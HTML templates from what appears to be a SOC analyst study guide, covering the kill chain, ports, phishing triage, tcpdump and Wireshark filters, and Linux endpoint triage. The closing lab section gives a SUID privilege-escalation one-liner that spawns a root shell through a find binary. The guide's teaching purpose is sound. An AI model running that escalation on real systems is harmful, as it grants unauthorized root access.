<template id="tpl-01-soc-fundamentals">
<article class="topic">
<h1>01 · Security Operations Fundamentals</h1>
<div class="osi-bar">
  <span class="osi-label">OSI Layers</span>
  <span class="osi-chip l3">L3 Network</span>
  <span class="osi-chip l4">L4 Transport</span>
  <span class="osi-chip l7">L7 Application</span>
  <span class="osi-note">SOC fundamentals span the full stack — common ports are L4 (TCP/UDP), protocols are L7 (HTTP, DNS, SMTP), and the Kill Chain tracks attacker movement across L3–L7.</span>
</div>
<hr class="divider">
<h2>SOC Analyst Tiers</h2>
<div class="table-wrap"><table>
  <thead><tr><th>Tier</th><th>Role</th><th>Responsibilities</th></tr></thead>
  <tbody>
    <tr><td>Tier 1</td><td>Alert Analyst</td><td>Monitor alerts, triage, escalate</td></tr>
    <tr><td>Tier 2</td><td>Incident Responder</td><td>Investigate escalated alerts, deeper analysis</td></tr>
    <tr><td>Tier 3</td><td>Threat Hunter</td><td>Proactive hunting, advanced forensics</td></tr>
    <tr><td>Lead</td><td>SOC Manager</td><td>Oversight, reporting, process management</td></tr>
  </tbody>
</table></div>
<h2>Essential Terms — Know These Cold</h2>
<div class="table-wrap"><table>
  <thead><tr><th>Term</th><th>Definition</th></tr></thead>
  <tbody>
    <tr><td>CIA Triad</td><td>Confidentiality · Integrity · Availability</td></tr>
    <tr><td>Alert</td><td>Notification a potential event has occurred</td></tr>
    <tr><td>Event</td><td>Any observable occurrence in a system or network</td></tr>
    <tr><td>Incident</td><td>Confirmed/suspected breach requiring response</td></tr>
    <tr><td>False Positive</td><td>Alert fires but no real threat exists</td></tr>
    <tr><td>True Positive</td><td>Alert fires and a real threat exists</td></tr>
    <tr><td>IOC</td><td>Indicator of Compromise — IP, hash, domain, URL</td></tr>
    <tr><td>TTPs</td><td>Tactics, Techniques, Procedures — HOW attackers operate</td></tr>
    <tr><td>OSINT</td><td>Open Source Intelligence — publicly available info</td></tr>
  </tbody>
</table></div>
<h2>Cyber Kill Chain — Attacker Progression</h2>
<p>Understanding this helps you know WHAT you are looking at in logs and alerts.</p>
<div class="table-wrap"><table>
  <thead><tr><th>Phase</th><th>Description</th></tr></thead>
  <tbody>
    <tr><td>1. Reconnaissance</td><td>Attacker gathers info — OSINT, scanning, enumeration</td></tr>
    <tr><td>2. Weaponization</td><td>Creates malware or exploit</td></tr>
    <tr><td>3. Delivery</td><td>Phishing email, USB, web exploit</td></tr>
    <tr><td>4. Exploitation</td><td>Executes code on victim system</td></tr>
    <tr><td>5. Installation</td><td>Installs backdoor for persistent access</td></tr>
    <tr><td>6. C2 (Command &amp; Control)</td><td>Establishes communication channel back to attacker</td></tr>
    <tr><td>7. Actions on Objectives</td><td>Data theft, ransomware, lateral movement</td></tr>
  </tbody>
</table></div>
<h2>Common Ports — Memorize These</h2>
<div class="table-wrap"><table>
  <thead><tr><th>Port</th><th>Protocol</th><th>Notes</th></tr></thead>
  <tbody>
    <tr><td>21</td><td>FTP</td><td>File transfer</td></tr>
    <tr><td>22</td><td>SSH</td><td>Secure shell — watch for brute force</td></tr>
    <tr><td>23</td><td>Telnet</td><td>Unencrypted — red flag if active</td></tr>
    <tr><td>25 / 465 / 587</td><td>SMTP</td><td>Email sending</td></tr>
    <tr><td>53</td><td>DNS</td><td>Name resolution — used in data exfil tunneling</td></tr>
    <tr><td>80</td><td>HTTP</td><td>Unencrypted web</td></tr>
    <tr><td>110 / 995</td><td>POP3 / POP3S</td><td>Email retrieval (995=secure)</td></tr>
    <tr><td>143 / 993</td><td>IMAP / IMAPS</td><td>Email sync (993=secure)</td></tr>
    <tr><td>443</td><td>HTTPS</td><td>Encrypted web</td></tr>
    <tr><td>445</td><td>SMB</td><td>Windows file sharing — EternalBlue target</td></tr>
    <tr><td>3306</td><td>MySQL</td><td>Database — should not be public facing</td></tr>
    <tr><td>3389</td><td>RDP</td><td>Remote desktop — brute force target</td></tr>
    <tr><td>4444</td><td>Metasploit</td><td>Common default reverse shell port</td></tr>
    <tr><td>31337</td><td>Elite</td><td>Classic hacker port — leet speak</td></tr>
  </tbody>
</table></div>

<hr class="tier-divider">
<div class="tier-heading">Skill Tiers</div>
<details class="tier beginner" open>
  <summary>🟢 Beginner — Core Concepts</summary>
  <div class="tier-body">
    <h4>SOC Foundations &amp; OSI Mapping</h4>
    <ul>
      <li><strong>CIA Triad</strong>: Confidentiality (encryption at L6/L7), Integrity (checksums at L3/L4), Availability (DDoS = L3/L4 flood)</li>
      <li><strong>Tier 1 daily workflow</strong>: Monitor alerts → triage → escalate → document</li>
      <li><strong>Port = L4 identifier</strong>: Every service runs on a port; knowing default ports instantly tells you the L7 protocol</li>
      <li>Kill Chain phases 1–3 (Recon/Weapon/Delivery) happen at L3/L4/L7 before any endpoint contact</li>
    </ul>
    <pre><code><span class="cm"># Mental model: port 443 = L4 destination port, HTTPS = L7 protocol</span>
<span class="cm"># Port 22 = SSH (L4:22 → L7:SSH)</span>
<span class="cm"># Port 3389 = RDP (L4:3389 → L7:RDP)</span>
<span class="cm"># Port 4444 = common Metasploit default reverse shell (L4:4444 → L7:Meterpreter)</span></code></pre>
  </div>
</details>
<details class="tier intermediate">
  <summary>🟡 Intermediate — Port + Protocol Fluency</summary>
  <div class="tier-body">
    <h4>Rapid L4/L7 Mapping</h4>
    <ul>
      <li>Memorize ALL ports in the common ports table — in SOC you must recognize them instantly</li>
      <li>DNS (53/UDP): L7 tunneling target — attackers encode data in DNS queries to bypass L4 firewall rules</li>
      <li>SMTP (25): common phishing vector; 587 = submission port used by mail clients</li>
      <li>IOC types by layer: IP address = L3, port = L4, domain/hash/URL = L7</li>
    </ul>
    <pre><code><span class="cm"># Quick triage: identify the OSI layer of any IOC</span>
192.168.56.10          → L3 Network (IP address)
TCP port 4444          → L4 Transport (destination port)
malware.exe hash       → L7 Application (file artifact)
evil.c2domain.com      → L7 Application (DNS name)
/uploads/shell.php     → L7 Application (URL path)</code></pre>
  </div>
</details>
<details class="tier advanced">
  <summary>🔴 Advanced — Kill Chain × OSI Correlation</summary>
  <div class="tier-body">
    <h4>Map Every Kill Chain Phase to OSI Layers</h4>
    <ul>
      <li>Reconnaissance: L3 ping sweeps, L4 port scans, L7 OSINT/web scraping</li>
      <li>Delivery: L7 (phishing email / malicious URL / macro in document)</li>
      <li>C2 Installation: L3/L4 outbound beacon to attacker IP:port; L7 HTTP/HTTPS/DNS for C2 channel</li>
      <li>Actions on Objectives: L7 data exfiltration (HTTP POST, DNS tunnel, SMTP)</li>
    </ul>
    <pre><code><span class="cm"># Kill Chain phase → OSI layer → Detection tool</span>
Recon       → L3/L4  → Firewall logs, Zeek conn.log
Delivery    → L7     → Email gateway, web proxy, Suricata HTTP rules
C2          → L3/L4/L7 → Suricata, Zeek dns.log, firewall blocks
Exfil       → L7     → Proxy logs, DLP, DNS anomaly detection</code></pre>
  </div>
</details>
</article>
</template>

<template id="tpl-02-phishing">
<article class="topic">
<h1>02 · Phishing Analysis</h1>
<div class="osi-bar">
  <span class="osi-label">OSI Layers</span>
  <span class="osi-chip l7">L7 Application</span>
  <span class="osi-note">Phishing operates entirely at L7 Application — the attack vector is email (SMTP/L7), the lure is a web page (HTTP/HTTPS/L7), and the payload delivery is an application-layer document or URL.</span>
</div>
<hr class="divider">
<h2>Social Engineering Tactics</h2>
<div class="table-wrap"><table>
  <thead><tr><th>Tactic</th><th>How Attackers Use It</th></tr></thead>
  <tbody>
    <tr><td>AUTHORITY</td><td>Spoofing executives, managers, IT staff</td></tr>
    <tr><td>TRUST</td><td>Spoofing customers, banks, partners</td></tr>
    <tr><td>INTIMIDATION</td><td>Instill fear of consequences</td></tr>
    <tr><td>SOCIAL PROOF</td><td>Validate legitimacy through consensus</td></tr>
    <tr><td>URGENCY</td><td>"ACT NOW!!! or it's too late"</td></tr>
    <tr><td>SCARCITY</td><td>Fear of missing out</td></tr>
    <tr><td>FAMILIARITY</td><td>Establish credibility through recognition</td></tr>
  </tbody>
</table></div>
<h2>Email Protocol Stack</h2>
<div class="table-wrap"><table>
  <thead><tr><th>Protocol</th><th>Purpose</th><th>Ports</th></tr></thead>
  <tbody>
    <tr><td>SMTP</td><td>Send outgoing mail</td><td>25, 465, 587</td></tr>
    <tr><td>POP3</td><td>Retrieve email (downloads)</td><td>110, 995 (secure)</td></tr>
    <tr><td>IMAP</td><td>Advanced email sync (server-side)</td><td>143, 993 (secure)</td></tr>
  </tbody>
</table></div>
<h2>Mail Agents</h2>
<div class="table-wrap"><table>
  <thead><tr><th>Agent</th><th>Full Name</th><th>Role</th></tr></thead>
  <tbody>
    <tr><td>MTA</td><td>Mail Transfer Agent</td><td>Determines route and relays email</td></tr>
    <tr><td>MUA</td><td>Mail User Agent</td><td>Gmail, Outlook, Thunderbird — compose/send/receive</td></tr>
    <tr><td>MDA</td><td>Mail Delivery Agent</td><td>Accepts incoming mail, places in recipient inbox</td></tr>
    <tr><td>MSA</td><td>Mail Submission Agent</td><td>Accepts mail from MUA, passes to MTA</td></tr>
  </tbody>
</table></div>
<h2>Phishing Analysis Methodology</h2>
<ol>
  <li><strong>Initial Triage</strong> — quickly assess and prioritize severity</li>
  <li><strong>Header &amp; Sender Examination</strong> — investigate MTA addresses, IPs, true origin</li>
  <li><strong>Context Examination</strong> — analyze language, formatting, social engineering red flags</li>
  <li><strong>Web &amp; URL Examination</strong> — collect artifacts, use tools to inspect URLs/domains</li>
  <li><strong>Attachment Examination</strong> — securely extract and analyze attachments</li>
</ol>
<h2>Email Authentication — DKIM, SPF, DMARC</h2>
<div class="table-wrap"><table>
  <thead><tr><th>Method</th><th>What It Does</th><th>Red Flag</th></tr></thead>
  <tbody>
    <tr><td>SPF</td><td>Lists authorized sending IPs for a domain</td><td>SPF fail = not sent from legit server</td></tr>
    <tr><td>DKIM</td><td>Cryptographic signature proving email wasn't tampered</td><td>Invalid sig = modified in transit</td></tr>
    <tr><td>DMARC</td><td>Policy telling receivers what to do on SPF/DKIM fail</td><td>"none" = not enforced</td></tr>
  </tbody>
</table></div>
<h2>Linux Phishing Analysis Commands</h2>
<pre><code><span class="cm"># Hash attachment for VirusTotal lookup</span>
sha256sum file.iso &amp;&amp; sha1sum file.iso &amp;&amp; md5sum file.iso

<span class="cm"># Decode base64 encoded content</span>
echo 'BASE64STRING' | base64 -d

<span class="cm"># Extract URLs from email file</span>
grep -oP 'https?://[^"]+' email.eml | sort -u

<span class="cm"># View raw email headers</span>
cat email.eml | head -60

<span class="cm"># Check file type regardless of extension</span>
file suspicious_attachment</code></pre>
<h2>Phishing Analysis Tools</h2>
<div class="table-wrap"><table>
  <thead><tr><th>Tool</th><th>Use</th></tr></thead>
  <tbody>
    <tr><td>MXToolbox</td><td>Analyze email headers — mxtoolbox.com/EmailHeaders</td></tr>
    <tr><td>VirusTotal</td><td>Hash/URL/IP/domain lookup — virustotal.com</td></tr>
    <tr><td>URLScan.io</td><td>Safe URL scanning with screenshot — urlscan.io</td></tr>
    <tr><td>AbuseIPDB</td><td>IP reputation check — abuseipdb.com</td></tr>
    <tr><td>PhishTool</td><td>Phishing analysis platform — phishtool.com</td></tr>
    <tr><td>Google Admin Toolbox</td><td>Header analyzer — toolbox.googleapps.com</td></tr>
  </tbody>
</table></div>
<h2>Phishing Attack Types</h2>
<div class="table-wrap"><table>
  <thead><tr><th>Type</th><th>Goal</th><th>Method</th></tr></thead>
  <tbody>
    <tr><td>Information Gathering</td><td>Collect data via recon</td><td>Verify accounts, craft credible phishes</td></tr>
    <tr><td>Credential Harvesting</td><td>Obtain login credentials</td><td>Fake login pages, deceptive URLs</td></tr>
    <tr><td>Malicious Delivery</td><td>Install malware</td><td>Malicious attachments, drive-by downloads</td></tr>
  </tbody>
</table></div>

<hr class="tier-divider">
<div class="tier-heading">Skill Tiers</div>
<details class="tier beginner" open>
  <summary>🟢 Beginner — Spotting Phishing Red Flags</summary>
  <div class="tier-body">
    <h4>What to Check First (L7 Application Layer)</h4>
    <ul>
      <li>Sender domain ≠ display name: <code>security@paypa1.com</code> vs "PayPal Security"</li>
      <li>Check Return-Path and X-Originating-IP headers — L3 source IP exposes real origin</li>
      <li>URL hovering: displayed text ≠ actual href (inspect the L7 destination URL)</li>
      <li>Urgency + authority = primary social engineering combo</li>
    </ul>
    <pre><code><span class="cm"># Check email headers: From, Return-Path, Received, Authentication-Results</span>
<span class="cm"># X-Originating-IP reveals L3 source IP of sending mail server</span>
<span class="cm"># SPF: checks if L3 sending IP is authorized for the domain</span>
<span class="cm"># DKIM: cryptographic L7 signature on email body</span>
<span class="cm"># DMARC: policy rule — what to do when SPF/DKIM fail</span></code></pre>
  </div>
</details>
<details class="tier intermediate">
  <summary>🟡 Intermediate — URL &amp; Attachment Analysis</summary>
  <div class="tier-body">
    <h4>Safe Analysis Workflow</h4>
    <ul>
      <li>Never click — always analyze in a sandboxed environment or via API</li>
      <li>URLScan.io: submits L7 URL to a headless browser, returns screenshot + L3/L4/L7 network activity</li>
      <li>VirusTotal: hash the attachment → check L7 malware family detection across 70+ AV engines</li>
      <li>AbuseIPDB: enrich the L3 source IP from email headers</li>
    </ul>
    <pre><code><span class="cm"># Phishing triage workflow</span>
1. Extract: From, Return-Path, Reply-To, X-Originating-IP
2. Check SPF/DKIM/DMARC authentication results
3. Defang URLs: hxxps://evil[.]com/payload
4. VirusTotal: hash the attachment (SHA256)
5. URLScan.io: scan landing page (L7)
6. AbuseIPDB: check originating IP (L3)</code></pre>
  </div>
</details>
<details class="tier advanced">
  <summary>🔴 Advanced — Campaign Attribution</summary>
  <div class="tier-body">
    <h4>Linking Phishing to Threat Actors</h4>
    <ul>
      <li>Track L3 infrastructure: IPs hosting phishing pages often reuse ASN/hosting providers</li>
      <li>Correlate L7 patterns: same HTML template, same redirect chain, same domain registration pattern</li>
      <li>PhishTool enriches full campaign mapping: attacker L3 IPs, L7 URLs, lure themes, targets</li>
      <li>MITRE ATT&CK T1566: Phishing sub-techniques for spearphishing link, attachment, service</li>
    </ul>
    <pre><code><span class="cm"># Advanced: extract all IoCs from a phishing email</span>
<span class="cm"># L3 IoCs: IP addresses in Received headers, X-Originating-IP</span>
<span class="cm"># L7 IoCs: domains in URLs, file hashes of attachments</span>
<span class="cm"># Cross-reference: check if C2 IP appeared in MISP or threat feeds</span>
<span class="cm"># Timeline: correlate with other alerts — same IP/domain hit other users?</span></code></pre>
  </div>
</details>
</article>
</template>

<template id="tpl-03-nsm">
<article class="topic">
<h1>03 · Network Security Monitoring (NSM)</h1>
<div class="osi-bar">
  <span class="osi-label">OSI Layers</span>
  <span class="osi-chip l2">L2 Data Link</span>
  <span class="osi-chip l3">L3 Network</span>
  <span class="osi-chip l4">L4 Transport</span>
  <span class="osi-chip l7">L7 Application</span>
  <span class="osi-note">NSM captures the full packet — L2 Ethernet frames, L3 IP headers (src/dst), L4 TCP/UDP segments (ports, flags), and L7 application payloads (HTTP, DNS, SMTP content).</span>
</div>
<hr class="divider">
<h2>Packet / Frame Structure</h2>
<p>Every packet travels through layers — <strong>FRAME → IP → TCP → DATA</strong></p>
<div class="table-wrap"><table>
  <thead><tr><th>Layer</th><th>Header Contains</th><th>Focus On</th></tr></thead>
  <tbody>
    <tr><td>FRAME (Layer 2)</td><td>Source MAC, Destination MAC</td><td>Who is on the local network</td></tr>
    <tr><td>IP (Layer 3)</td><td>Source IP, Destination IP</td><td>Where packet is going</td></tr>
    <tr><td>TCP/UDP (Layer 4)</td><td>Source Port, Destination Port</td><td>What service/application</td></tr>
    <tr><td>Data (Layer 7)</td><td>Payload (index.html, etc)</td><td>What was actually sent</td></tr>
  </tbody>
</table></div>
<div class="callout"><strong>KEY:</strong> Always focus on SOURCE ADDRESS and DESTINATION ADDRESS first.</div>
<h2>TCP vs UDP</h2>
<div class="table-wrap"><table>
  <thead><tr><th>Feature</th><th>TCP</th><th>UDP</th></tr></thead>
  <tbody>
    <tr><td>Connection</td><td>3-way handshake (SYN / SYN-ACK / ACK)</td><td>Connectionless</td></tr>
    <tr><td>Reliability</td><td>Guaranteed delivery</td><td>Best effort — no guarantee</td></tr>
    <tr><td>Speed</td><td>Slower (overhead)</td><td>Faster (no overhead)</td></tr>
    <tr><td>Use Cases</td><td>HTTP, SSH, FTP, email</td><td>DNS, streaming, VoIP</td></tr>
    <tr><td>Header Fields</td><td>Seq#, Ack#, Flags, Window</td><td>Length, Checksum only</td></tr>
  </tbody>
</table></div>
<h2>NSM Tools</h2>
<div class="table-wrap"><table>
  <thead><tr><th>Tool</th><th>Purpose</th></tr></thead>
  <tbody>
    <tr><td>tcpdump</td><td>CLI packet capture — lightweight, scriptable</td></tr>
    <tr><td>Wireshark</td><td>GUI deep packet inspection</td></tr>
    <tr><td>Zeek (Bro)</td><td>Network analysis framework — generates structured logs</td></tr>
    <tr><td>Suricata</td><td>IDS/IPS — signature + anomaly detection</td></tr>
    <tr><td>Snort</td><td>IDS/IPS — industry standard rules</td></tr>
    <tr><td>Security Onion</td><td>Full NSM platform</td></tr>
  </tbody>
</table></div>
<h2>tcpdump — Essential Commands</h2>
<pre><code><span class="cm"># Capture all traffic on interface</span>
sudo tcpdump -i eth0
<span class="cm"># Save capture to file</span>
sudo tcpdump -i eth0 -w capture.pcap
<span class="cm"># Read saved pcap file</span>
sudo tcpdump -r capture.pcap
<span class="cm"># Filter by host IP</span>
sudo tcpdump -i eth0 host 192.168.1.1
<span class="cm"># Filter by port</span>
sudo tcpdump -i eth0 port 80
<span class="cm"># Filter by source IP</span>
sudo tcpdump -i eth0 src 10.0.0.1
<span class="cm"># Filter by destination IP</span>
sudo tcpdump -i eth0 dst 10.0.0.2
<span class="cm"># Show ASCII readable output</span>
sudo tcpdump -i eth0 -A
<span class="cm"># Show hex and ASCII</span>
sudo tcpdump -i eth0 -XX
<span class="cm"># Capture only N packets</span>
sudo tcpdump -i eth0 -c 100
<span class="cm"># Capture HTTP and HTTPS</span>
sudo tcpdump -i eth0 port 80 or port 443
<span class="cm"># Don't resolve hostnames (faster)</span>
sudo tcpdump -i eth0 -n</code></pre>

<hr class="tier-divider">
<div class="tier-heading">Skill Tiers</div>
<details class="tier beginner" open>
  <summary>🟢 Beginner — Reading Packets &amp; tcpdump Basics</summary>
  <div class="tier-body">
    <h4>Every Packet Has a Stack of Headers</h4>
    <ul>
      <li><strong>L2 Ethernet frame</strong>: src/dst MAC address (hardware identity)</li>
      <li><strong>L3 IP header</strong>: src/dst IP address (logical network identity)</li>
      <li><strong>L4 TCP/UDP header</strong>: src/dst port, flags (SYN, ACK, FIN, RST)</li>
      <li><strong>L7 payload</strong>: actual application data (HTTP request, DNS query, etc.)</li>
    </ul>
    <pre><code><span class="cm"># Capture on eth0, show first 100 packets without resolving names</span>
sudo tcpdump -i eth0 -c 100 -n
<span class="cm"># Filter by L3 host</span>
sudo tcpdump -i eth0 -n host 192.168.56.30
<span class="cm"># Filter by L4 port (captures L7 HTTP traffic)</span>
sudo tcpdump -i eth0 -n port 80 or port 443</code></pre>
  </div>
</details>
<details class="tier intermediate">
  <summary>🟡 Intermediate — Targeted Capture Filters</summary>
  <div class="tier-body">
    <h4>Combining L3 + L4 Filters</h4>
    <ul>
      <li>BPF (Berkeley Packet Filter) filters run at kernel level — much faster than display filters</li>
      <li>Combine L3 and L4 filters to isolate specific traffic: <code>host AND port</code></li>
      <li><code>-w</code> saves to PCAP for Wireshark analysis; <code>-r</code> reads saved PCAP</li>
    </ul>
    <pre><code><span class="cm"># L3 src + L4 destination port (attacker scanning victim)</span>
sudo tcpdump -i eth0 -n src 192.168.56.10 and dst port 445
<span class="cm"># Capture DNS (L7 over L4 UDP 53)</span>
sudo tcpdump -i eth0 -n port 53
<span class="cm"># Save to file for Wireshark analysis</span>
sudo tcpdump -i eth0 -n -w /tmp/capture.pcap
<span class="cm"># Read saved capture</span>
sudo tcpdump -r /tmp/capture.pcap -n</code></pre>
  </div>
</details>
<details class="tier advanced">
  <summary>🔴 Advanced — Full NSM Workflow</summary>
  <div class="tier-body">
    <h4>NSM Investigation Process</h4>
    <ul>
      <li>Security Onion integrates Zeek (deep L2-L7 analysis), Suricata (L3/L4/L7 IDS), and PCAP in one platform</li>
      <li>Workflow: Suricata alert (L3 src IP + L7 rule signature) → Zeek logs (L4 flow context) → PCAP (full L2 evidence)</li>
      <li>IDS signature hits tell you the rule fired; PCAP lets you verify the actual L7 payload</li>
    </ul>
    <pre><code><span class="cm"># NSM pivot: from alert to full evidence chain</span>
1. Suricata alert: rule fired, src IP 192.168.56.10 (L3), dst port 445 (L4)
2. Zeek conn.log: connection duration, bytes transferred (L3/L4 flow)
3. Wireshark: open PCAP, filter: ip.addr==192.168.56.10 &amp;&amp; tcp.port==445
4. Follow TCP Stream: read L7 SMB payload to confirm exploit attempt</code></pre>
  </div>
</details>
</article>
</template>

<template id="tpl-04-wireshark">
<article class="topic">
<h1>04 · Network Traffic Analysis — Wireshark &amp; tcpdump</h1>
<div class="osi-bar">
  <span class="osi-label">OSI Layers</span>
  <span class="osi-chip l2">L2 Data Link</span>
  <span class="osi-chip l3">L3 Network</span>
  <span class="osi-chip l4">L4 Transport</span>
  <span class="osi-chip l7">L7 Application</span>
  <span class="osi-note">Wireshark and tcpdump decode every layer from raw L2 frames to L7 application payloads. Filters select specific layers: eth (L2), ip (L3), tcp/udp (L4), http/dns (L7).</span>
</div>
<hr class="divider">
<h2>Wireshark Display Filters</h2>
<div class="table-wrap"><table>
  <thead><tr><th>Filter</th><th>What It Shows</th></tr></thead>
  <tbody>
    <tr><td><code>ip.addr == 192.168.1.1</code></td><td>All traffic to/from this IP</td></tr>
    <tr><td><code>ip.src == 10.0.0.1</code></td><td>Traffic FROM this IP only</td></tr>
    <tr><td><code>ip.dst == 10.0.0.2</code></td><td>Traffic TO this IP only</td></tr>
    <tr><td><code>tcp.port == 4444</code></td><td>Traffic on port 4444 (reverse shell port)</td></tr>
    <tr><td><code>tcp.port == 80</code></td><td>HTTP traffic</td></tr>
    <tr><td><code>http</code></td><td>All HTTP protocol traffic</td></tr>
    <tr><td><code>dns</code></td><td>All DNS traffic</td></tr>
    <tr><td><code>http.request.method == "POST"</code></td><td>HTTP POST requests — often creds or data</td></tr>
    <tr><td><code>tcp.flags.syn == 1</code></td><td>TCP SYN — connection starts (scan detection)</td></tr>
    <tr><td><code>!(arp or dns or icmp)</code></td><td>Exclude noise — see real traffic</td></tr>
    <tr><td><code>frame contains "password"</code></td><td>Find frames with literal word password</td></tr>
    <tr><td><code>http.response.code == 200</code></td><td>Successful responses</td></tr>
    <tr><td><code>http.response.code == 404</code></td><td>Not found — possible enumeration</td></tr>
  </tbody>
</table></div>
<h2>Wireshark Tips</h2>
<ul>
  <li><strong>Statistics &gt; Conversations</strong> — see who is talking to whom and how much</li>
  <li><strong>Statistics &gt; Protocol Hierarchy</strong> — breakdown of traffic types</li>
  <li><strong>File &gt; Export Objects &gt; HTTP</strong> — extract files transferred over HTTP</li>
  <li><strong>Follow TCP Stream</strong> — see the full conversation between two hosts</li>
  <li><strong>Right click packet &gt; Apply as Filter</strong> — instant filtering</li>
  <li><strong>Edit &gt; Find Packet &gt; String</strong> — search packet contents for keywords</li>
</ul>
<h2>Investigation Workflow</h2>
<ol>
  <li>Open pcap → check <strong>Statistics &gt; Conversations</strong> to find top talkers</li>
  <li>Check <strong>Protocol Hierarchy</strong> for unexpected protocols</li>
  <li>Filter by suspicious IP or port</li>
  <li>Follow TCP Stream to read content</li>
  <li>Export HTTP objects if files were transferred</li>
  <li>Hash any extracted files for VirusTotal lookup</li>
</ol>

<hr class="tier-divider">
<div class="tier-heading">Skill Tiers</div>
<details class="tier beginner" open>
  <summary>🟢 Beginner — Wireshark Display Filters by Layer</summary>
  <div class="tier-body">
    <h4>Select the Right Layer for Your Investigation</h4>
    <ul>
      <li><strong>L2 filter</strong>: <code>eth.src == aa:bb:cc:dd:ee:ff</code> (track by MAC)</li>
      <li><strong>L3 filter</strong>: <code>ip.addr == 192.168.56.10</code> (track by IP)</li>
      <li><strong>L4 filter</strong>: <code>tcp.port == 4444</code> or <code>udp.port == 53</code></li>
      <li><strong>L7 filter</strong>: <code>http</code>, <code>dns</code>, <code>smtp</code> (protocol keyword)</li>
    </ul>
    <pre><code><span class="cm"># L3 — show all traffic to/from victim</span>
ip.addr == 192.168.56.30
<span class="cm"># L4 — show SYN scan packets (no ACK)</span>
tcp.flags.syn == 1 and tcp.flags.ack == 0
<span class="cm"># L7 — show only HTTP requests</span>
http.request</code></pre>
  </div>
</details>
<details class="tier intermediate">
  <summary>🟡 Intermediate — Protocol Analysis &amp; Stream Following</summary>
  <div class="tier-body">
    <h4>Reconstruct L7 Application Conversations</h4>
    <ul>
      <li>Statistics → Protocol Hierarchy: see the L7 protocol breakdown of the entire PCAP</li>
      <li>Statistics → Conversations: rank talkers by L3 IP pairs and L4 port pairs</li>
      <li>Right-click a TCP packet → Follow TCP Stream: reconstructs L7 application dialogue</li>
      <li>File → Export Objects → HTTP: extracts transferred files (malware, documents)</li>
    </ul>
    <pre><code><span class="cm"># Triage workflow: top talkers → suspicious L7 protocol → follow stream</span>
1. Statistics > Conversations > TCP tab → sort by bytes
2. Identify unusual L3 destination IPs
3. Filter: ip.addr == [suspicious IP]
4. Right-click packet → Follow TCP Stream
5. Read L7 content — look for shell commands, credential theft, exfil</code></pre>
  </div>
</details>
<details class="tier advanced">
  <summary>🔴 Advanced — tshark CLI &amp; PCAP Automation</summary>
  <div class="tier-body">
    <h4>tshark for Scripted L3/L4/L7 Analysis</h4>
    <ul>
      <li>tshark (Wireshark CLI) enables automated PCAP processing in bash scripts or pipelines</li>
      <li>Extract specific fields from all packets using <code>-T fields -e field.name</code></li>
      <li>Combine with grep/sort/uniq for rapid statistical analysis of large PCAPs</li>
    </ul>
    <pre><code><span class="cm"># Extract all L3 destination IPs from PCAP</span>
tshark -r capture.pcap -T fields -e ip.dst | sort | uniq -c | sort -rn | head 20
<span class="cm"># Extract L7 HTTP hosts (C2 domain hunting)</span>
tshark -r capture.pcap -Y "http.request" -T fields -e http.host | sort -u
<span class="cm"># Extract L4 destination ports (find unusual L4 usage)</span>
tshark -r capture.pcap -T fields -e tcp.dstport | sort | uniq -c | sort -rn</code></pre>
  </div>
</details>
</article>
</template>

<template id="tpl-05-endpoint">
<article class="topic">
<h1>05 · Endpoint Security Monitoring</h1>
<div class="osi-bar">
  <span class="osi-label">OSI Layers</span>
  <span class="osi-chip l7">L7 Application</span>
  <span class="osi-note">Endpoint monitoring operates at L7 — it tracks application-layer artifacts: processes, files, registry keys, user accounts, and SUID binaries. Network connections from endpoints add L3/L4 context when combined with NSM.</span>
</div>
<hr class="divider">
<h2>Linux Endpoint Triage — Full Command Reference</h2>
<pre><code><span class="cm"># List all running processes</span>
ps aux
<span class="cm"># Show process tree (parent/child)</span>
ps auxf
<span class="cm"># Find process by name</span>
sudo ps aux | grep processname
<span class="cm"># Show all listening ports + PIDs</span>
sudo ss -tlnp
<span class="cm"># Show all listening ports (alt)</span>
sudo netstat -tlnp
<span class="cm"># Show all active connections</span>
sudo ss -anp
<span class="cm"># Check process binary path (symlink)</span>
sudo ls -l /proc/[PID]/exe
<span class="cm"># Read process command line invocation</span>
sudo cat /proc/[PID]/cmdline | tr '\0' ' '
<span class="cm"># List open files for a process</span>
sudo lsof -p [PID]
<span class="cm"># Hash file for VirusTotal</span>
sudo sha256sum /path/to/file
<span class="cm"># Hash process even if file deleted</span>
sudo sha256sum /proc/[PID]/exe
<span class="cm"># Extract strings from binary</span>
sudo strings /proc/[PID]/exe
<span class="cm"># Filter strings for useful info</span>
sudo strings /proc/[PID]/exe | grep -i 'usage\|version\|banner'
<span class="cm"># Check system-wide cron jobs</span>
sudo cat /etc/crontab
<span class="cm"># Check cron.d directory</span>
sudo ls -la /etc/cron.d/
<span class="cm"># Check user cron jobs</span>
sudo cat /var/spool/cron/crontabs/root
<span class="cm"># List startup services</span>
systemctl list-units --type=service
<span class="cm"># Find recently modified files (1hr)</span>
find / -mmin -60 -type f 2>/dev/null
<span class="cm"># Find SUID binaries (privesc check)</span>
find / -perm -4000 -type f 2>/dev/null
<span class="cm"># Kill process by PID</span>
sudo kill [PID]</code></pre>
<h2>Key File Locations on Linux</h2>
<div class="table-wrap"><table>
  <thead><tr><th>Path</th><th>Significance</th></tr></thead>
  <tbody>
    <tr><td>/tmp</td><td>World-writable — #1 malware drop location</td></tr>
    <tr><td>/var/tmp</td><td>Persistent temp — also used by malware</td></tr>
    <tr><td>/etc/crontab</td><td>System cron jobs — persistence mechanism</td></tr>
    <tr><td>/etc/cron.d/</td><td>Additional cron directory — check this too</td></tr>
    <tr><td>/var/spool/cron/crontabs/</td><td>Per-user cron jobs</td></tr>
    <tr><td>/etc/passwd</td><td>User account list</td></tr>
    <tr><td>/etc/shadow</td><td>Password hashes (root only)</td></tr>
    <tr><td>/var/log/auth.log</td><td>Authentication events</td></tr>
    <tr><td>/var/log/syslog</td><td>System events</td></tr>
    <tr><td>/var/log/apache2/</td><td>Web server logs</td></tr>
    <tr><td>/proc/[PID]/</td><td>Live process data — survives deletion!</td></tr>
    <tr><td>/root/.bash_history</td><td>Root command history</td></tr>
    <tr><td>/home/user/.bash_history</td><td>User command history</td></tr>
  </tbody>
</table></div>
<h2>SUID Binary Privilege Escalation</h2>
<div class="callout lab"><strong>From the Lab (Janus/Mercury/Pluto CTF)</strong></div>
<pre><code><span class="cm"># Find all SUID binaries on system</span>
find / -perm -4000 -type f 2>/dev/null
<span class="cm"># Exploit SUID find binary (GTFOBins)</span>
sys_check . -exec /bin/sh -p \; -quit
<span class="cm"># Verify you escalated to root</span>
whoami</code></pre>
<p><strong>SUID</strong> = Set User ID. If a binary has SUID and is owned by root, running it gives root privileges. Check <code>gtfobins.github.io</code> for exploitable binaries.</p>

